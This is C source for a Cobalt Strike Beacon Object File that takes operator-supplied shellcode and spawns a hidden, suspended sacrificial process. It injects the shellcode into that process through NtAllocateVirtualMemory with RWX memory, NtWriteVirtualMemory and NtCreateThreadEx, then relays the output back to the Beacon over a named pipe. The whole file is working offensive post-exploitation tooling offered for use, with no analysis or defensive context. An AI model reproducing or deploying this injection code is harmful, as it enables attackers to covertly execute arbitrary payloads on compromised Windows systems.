#include <windows.h>
#include "Beacon.h"
#include "IPC.h"

#define NT_SUCCESS(Status) ( ( ( NTSTATUS ) ( Status ) ) >= 0 )

DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError(VOID);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CreateProcessW(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateNamedPipeA(LPCSTR lpName, DWORD dwOpenMode, DWORD dwPipeMode, DWORD nMaxInstances, DWORD nOutBufferSize, DWORD nInBufferSize, DWORD nDefaultTimeOut, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ConnectNamedPipe(HANDLE hNamedPipe, LPOVERLAPPED lpOverlapped);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE hObject);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$GetExitCodeProcess(HANDLE hProcess, LPDWORD lpExitCode);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$DisconnectNamedPipe(HANDLE hNamedPipe);
DECLSPEC_IMPORT VOID   WINAPI KERNEL32$Sleep(DWORD dwMilliseconds);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$PeekNamedPipe(HANDLE hNamedPipe, LPVOID lpBuffer, DWORD nBufferSize, LPDWORD lpBytesRead, LPDWORD lpTotalBytesAvail, LPDWORD lpBytesLeftThisMessage);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);

DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtAllocateVirtualMemory(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtWriteVirtualMemory   (HANDLE, PVOID, PVOID, ULONG, PULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtCreateThreadEx       (PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

/* Helper function to accumulate message data in cache */
void AccumulateInCache(char* cacheBuffer, int* cacheLen, char* dataPtr, int dataLen) {
    int i;
    
    /* Check if adding this would exceed cache */
    #define CACHE_BUFFER_SIZE 8192
    if (*cacheLen + dataLen >= CACHE_BUFFER_SIZE - 1) {
        /* Flush cache if it has content */
        if (*cacheLen > 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "%s", cacheBuffer);
            *cacheLen = 0;
            for (i = 0; i < CACHE_BUFFER_SIZE; i++) {
                cacheBuffer[i] = 0;
            }
        }
    }
    
    /* Copy data to cache */
    for (i = 0; i < dataLen; i++) {
        cacheBuffer[*cacheLen + i] = dataPtr[i];
    }
    *cacheLen += dataLen;
    cacheBuffer[*cacheLen] = 0;
}

/* Helper function to clean cache from delimiters before final flush */
void CleanAndFlushCache(char* cacheBuffer, int* cacheLen) {
    int writeIdx = 0;
    int readIdx = 0;
    int delimLen = sizeof(MESSAGE_DELIMITER) - 1;
    int endDelimLen = sizeof(CLIENT_DISCONNECT) - 1;
    int i;
    
    if (*cacheLen > 0) {
        while (readIdx < *cacheLen) {
            /* Check if @START@ is at current position */
            int isStartDelim = 1;
            if (readIdx + delimLen <= *cacheLen) {
                for (i = 0; i < delimLen; i++) {
                    if (cacheBuffer[readIdx + i] != ((char*)MESSAGE_DELIMITER)[i]) {
                        isStartDelim = 0;
                        break;
                    }
                }
            } else {
                isStartDelim = 0;
            }
            
            /* Check if @END@ is at current position */
            int isEndDelim = 0;
            if (!isStartDelim && readIdx + endDelimLen <= *cacheLen) {
                isEndDelim = 1;
                for (i = 0; i < endDelimLen; i++) {
                    if (cacheBuffer[readIdx + i] != ((char*)CLIENT_DISCONNECT)[i]) {
                        isEndDelim = 0;
                        break;
                    }
                }
            }
            
            if (isStartDelim) {
                /* Skip @START@ delimiter */
                readIdx += delimLen;
            } else if (isEndDelim) {
                /* Skip @END@ delimiter */
                readIdx += endDelimLen;
            } else {
                /* Copy character */
                cacheBuffer[writeIdx] = cacheBuffer[readIdx];
                writeIdx++;
                readIdx++;
            }
        }
        
        *cacheLen = writeIdx;
        cacheBuffer[*cacheLen] = 0;
        
        /* Flush remaining cache */
        BeaconPrintf(CALLBACK_OUTPUT, "%s", cacheBuffer);
    }
}

/* Helper function to create a dummy process */
BOOL CreateDummyProcess(PROCESS_INFORMATION* processInfo) {
    STARTUPINFOW startupInfo = { 0 };
    WCHAR spawnToBuffer[MAX_PATH] = { 0 };
    BOOL isX86 = FALSE;

    /* Get the spawn-to binary path */
    BeaconGetSpawnTo(isX86, (char*)spawnToBuffer, MAX_PATH);

    /* Configure STARTUPINFO */
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    startupInfo.wShowWindow = SW_HIDE;
    startupInfo.hStdInput = NULL;
    startupInfo.hStdOutput = NULL;
    startupInfo.hStdError = NULL;
    
    /* Create process */
    BOOL createResult = KERNEL32$CreateProcessW(
        NULL,
        spawnToBuffer,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | CREATE_NEW_CONSOLE | CREATE_SUSPENDED,
        NULL,
        NULL,
        &startupInfo,
        processInfo
    );
    
    if (!createResult) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error creating process: GetLastError = %d", KERNEL32$GetLastError());
        return FALSE;
    }
    
    return TRUE;
}

/* Helper function to inject shellcode */
BOOL InjectShellcode(PROCESS_INFORMATION* processInfo, char* shellcode, unsigned int shellcodeLen) {
    PVOID remoteBuffer = NULL;
    SIZE_T allocSize = shellcodeLen;
    NTSTATUS status;

    /* Allocate memory in remote process */
    status = NTDLL$NtAllocateVirtualMemory(
        processInfo->hProcess,
        &remoteBuffer,
        0,
        &allocSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error allocating memory: 0x%x", status);
        return FALSE;
    }

    /* Write shellcode to remote process */
    ULONG written = 0;
    status = NTDLL$NtWriteVirtualMemory(
        processInfo->hProcess,
        remoteBuffer,
        (PVOID)shellcode,
        (ULONG)shellcodeLen,
        &written
    );
    
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error writing shellcode: 0x%x", status);
        return FALSE;
    }
    
    /* Create remote thread to execute shellcode */
    HANDLE remoteThread = NULL;
    status = NTDLL$NtCreateThreadEx(
        &remoteThread,
        THREAD_ALL_ACCESS,
        NULL,
        processInfo->hProcess,
        (PVOID)remoteBuffer,
        NULL,
        0,
        0,
        0,
        0,
        NULL
    );
    
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error creating remote thread: 0x%x", status);
        return FALSE;
    }
    
    return TRUE;
}

/* IPC functions */
static void BuildPipeName(char* dest, const char* name, const char* host) {
    int i = 0;
    int j = 0;
    
    if (host == NULL) {
        /* Local pipe: \\.\pipe\ */
        const char* localPrefix = "\\\\.\\pipe\\";
        for (i = 0; localPrefix[i] != '\0'; i++) {
            dest[i] = localPrefix[i];
        }
    } else {
        /* Remote pipe: \\<host>\pipe\ */
        dest[i++] = '\\';
        dest[i++] = '\\';
        
        /* Copy hostname */
        for (j = 0; host[j] != '\0'; j++) {
            dest[i + j] = host[j];
        }
        i += j;
        
        dest[i++] = '\\';
        dest[i++] = 'p';
        dest[i++] = 'i';
        dest[i++] = 'p';
        dest[i++] = 'e';
        dest[i++] = '\\';
    }
    
    /* Copy pipe name */
    for (j = 0; name[j] != '\0'; j++) {
        dest[i + j] = name[j];
    }
    dest[i + j] = '\0';
}

HANDLE InitializeIpcServer(const char* channel_name) {
    char pipe_name[256];
    BuildPipeName(pipe_name, channel_name, NULL);
    
    HANDLE h_pipe = KERNEL32$CreateNamedPipeA(
        pipe_name,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_NOWAIT, /* Non-blocking mode */
        PIPE_UNLIMITED_INSTANCES,
        IPC_BUFFER_SIZE,
        IPC_BUFFER_SIZE,
        0,
        NULL
    );
    
    if (h_pipe == INVALID_HANDLE_VALUE) {
        return NULL;
    }
    
    /* Try to accept connection (non-blocking due to PIPE_NOWAIT) */
    BOOL connected = KERNEL32$ConnectNamedPipe(h_pipe, NULL);
    if (!connected) {
        DWORD error = KERNEL32$GetLastError();
        /* ERROR_PIPE_CONNECTED means client already connected */
        /* ERROR_NO_DATA means no client yet - both are OK for non-blocking */
        /* ERROR_IO_PENDING means operation is pending - also OK for non-blocking */
        /* Error 536 also seems to be normal for non-blocking pipes */
        if (error != ERROR_PIPE_CONNECTED && error != ERROR_NO_DATA && error != ERROR_IO_PENDING && error != 536) {
            KERNEL32$CloseHandle(h_pipe);
            return NULL;
        }
    }

    return h_pipe;
}

BOOL CheckIpcMessages(IpcInstance* ipc) {
    if (!ipc || !ipc->h_channel || ipc->h_channel == INVALID_HANDLE_VALUE) {
        return FALSE;
    }
    
    DWORD bytes_available = 0;
    if (!KERNEL32$PeekNamedPipe(ipc->h_channel, NULL, 0, NULL, &bytes_available, NULL)) {
        return FALSE;
    }
    
    return bytes_available > 0;
}

BOOL CloseIpcServer(IpcInstance* ipc) {
    if (!ipc || !ipc->h_channel || ipc->h_channel == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    KERNEL32$DisconnectNamedPipe(ipc->h_channel);
    KERNEL32$CloseHandle(ipc->h_channel);
    return TRUE;
}

BOOL RetrieveIpcMessage(IpcInstance* ipc, char* buffer, DWORD buffer_size) {
    if (!ipc || !ipc->h_channel || ipc->h_channel == INVALID_HANDLE_VALUE || !buffer) {
        return FALSE;
    }
    
    DWORD bytes_read = 0;
    
    /* Non-blocking read - returns immediately if no data */
    BOOL result = KERNEL32$ReadFile(ipc->h_channel, buffer, buffer_size - 1, &bytes_read, NULL);
    
    if (result && bytes_read > 0) {
        buffer[bytes_read] = '\0';
        return TRUE;
    }
    
    /* Check if no data available (normal for non-blocking) */
    DWORD error = KERNEL32$GetLastError();
    if (error == ERROR_NO_DATA || error == ERROR_PIPE_LISTENING) {
        /* No data available right now - not an error */
        return FALSE;
    }
    
    return FALSE;
}

void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    
    int shellcodeLen = BeaconDataInt(&parser);
    char* shellcode = BeaconDataExtract(&parser, &shellcodeLen);
    
    if (!shellcode || shellcodeLen == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to extract shellcode");
        return;
    }
    
    PROCESS_INFORMATION processInfo = { 0 };
    
    if (!CreateDummyProcess(&processInfo)) {
        return;
    }
    
    HANDLE ipcServerHandle = InitializeIpcServer("Remote-BOF-Runner-Pipe");
    if (!ipcServerHandle) {
        BeaconCleanupProcess(&processInfo);
        return;
    }
    
    if (!InjectShellcode(&processInfo, shellcode, shellcodeLen)) {
        CloseIpcServer((IpcInstance*)ipcServerHandle);
        BeaconCleanupProcess(&processInfo);
        return;
    }
    
    IpcInstance ipcInstance = { 0 };
    ipcInstance.h_channel = ipcServerHandle;
    
    DWORD exitCode = 0;
    
    /* Cache buffer for accumulated output */
    char* cacheBuffer = KERNEL32$VirtualAlloc(NULL, CACHE_BUFFER_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    int cacheLen = 0;
    int i;
    
    if (!cacheBuffer) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate cache buffer");
        CloseIpcServer(&ipcInstance);
        BeaconCleanupProcess(&processInfo);
        return;
    }
    
    /* Initialize cache buffer */
    for (i = 0; i < CACHE_BUFFER_SIZE; i++) {
        cacheBuffer[i] = 0;
    }
    
    while(1) {        
        if (CheckIpcMessages(&ipcInstance)) {
            char msgBuf[IPC_BUFFER_SIZE] = { 0 };
            if (RetrieveIpcMessage(&ipcInstance, msgBuf, sizeof(msgBuf))) {
                /* Skip MESSAGE_DELIMITER prefix */
                char* dataPtr = msgBuf + sizeof(MESSAGE_DELIMITER) - 1;
                
                /* Calculate length of data */
                int dataLen = 0;
                while (dataPtr[dataLen] != 0 && dataLen < IPC_BUFFER_SIZE) {
                    dataLen++;
                }
                
                /* Accumulate data in cache */
                AccumulateInCache(cacheBuffer, &cacheLen, dataPtr, dataLen);
            }
        }

        if (!KERNEL32$GetExitCodeProcess(processInfo.hProcess, &exitCode) || exitCode != STILL_ACTIVE) {
            break;
        }
        
        KERNEL32$Sleep(1*1000);
    }
    
    /* Clean delimiters and flush cache */
    CleanAndFlushCache(cacheBuffer, &cacheLen);
    
    /* Free allocated cache buffer */
    KERNEL32$VirtualFree(cacheBuffer, 0, MEM_RELEASE);
    
    CloseIpcServer(&ipcInstance);
    BeaconCleanupProcess(&processInfo);
}